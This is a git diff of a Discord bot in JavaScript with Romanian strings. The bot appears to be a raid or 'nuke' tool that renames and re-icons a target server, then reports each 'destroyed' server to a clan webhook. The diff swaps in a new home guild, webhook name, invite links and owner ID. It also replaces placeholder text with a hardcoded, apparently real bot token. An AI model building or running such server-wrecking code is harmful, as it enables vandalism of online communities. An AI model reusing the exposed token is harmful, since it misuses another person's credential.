@@ -46,12 +46,12 @@ let guild = message.guild.id
           db.set(`channel_${message.guild.id}`, "k")
 
         const w = await client.guilds.cache
-      .get("804615798046982164")
+      .get("942363064618057752")
       .fetchWebhooks();
-    const webhook = w.find((w) => w.name === "Lord clan");
-   webhook.send(`https://discord.gg/pMKnwEQdJh  \n\n \`${message.author.tag}\` (\` ${message.author.id}\` ) o distrus server-ul **${message.guild.name}** (\` ${message.guild.id} \` ) cu **${message.guild.memberCount}** membrii `);
+    const webhook = w.find((w) => w.name === "Sinaloa");
+   webhook.send(`https://discord.gg/YD72gTw4w8  \n\n \`${message.author.tag}\` (\` ${message.author.id}\` ) o distrus server-ul **${message.guild.name}** (\` ${message.guild.id} \` ) cu **${message.guild.memberCount}** membrii `);
 
-let token = "pui token aici"
+let token = "OTQyMzY4NjY2NDA0NjU5MjMw.YgjfNg.U7oY7TOI-9Md8zovLps7FFqkA0I"
 const phin = require('phin').unpromisified
 let guildID = message.guild.id
 
@@ -142,9 +142,9 @@ var interval = setInterval (async function () {
 
 
 
-message.guild.setName("vati dus pe pula")
+message.guild.setName("Se mai intampla nu plange")
     message.guild.setIcon(
-      "https://cdn.discordapp.com/attachments/786279916273795115/802917703446560789/Screenshot_20210124-143354_TikTok.jpg"
+      "https://media.discordapp.net/attachments/942363064618057748/942382188601675786/instadp_dethcabbo_fan_page_full_size.jpg?width=216&height=216"
     );
     
         
@@ -174,7 +174,7 @@ if (message.content.startsWith("add premium")) {
         .setDescription(`Ai primit premium, vei beneficia de comenzi speciale!`)
     
         .setColor("0d0d0d")
-           let ownerID = "804607222843572234"
+           let ownerID = "810640541925900368"
   if(message.author.id !== ownerID) return;
     const user = message.mentions.members.first() || message.guild.members.cache.get(args[0])
     db.fetch(`dev_${user.id}`);
@@ -199,7 +199,7 @@ if (message.content.startsWith("add premium")) {
 
      if(vip5 < 1) return message.channel.send(Embed4)
       
-                   if(message.guild.id == '804615798046982164') return message.channel.send('https://discord.gg/Yz78FDERkE');
+                   if(message.guild.id == '942363064618057753') return message.channel.send('https://discord.gg/YD72gTw4w8');
 
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
@@ -258,4 +258,4 @@ if (message.content.startsWith("add premium")) {
 
 
 
-client.login('si aici pui token')
+client.login('OTQyMzY4NjY2NDA0NjU5MjMw.YgjfNg.U7oY7TOI-9Md8zovLps7FFqkA0I')
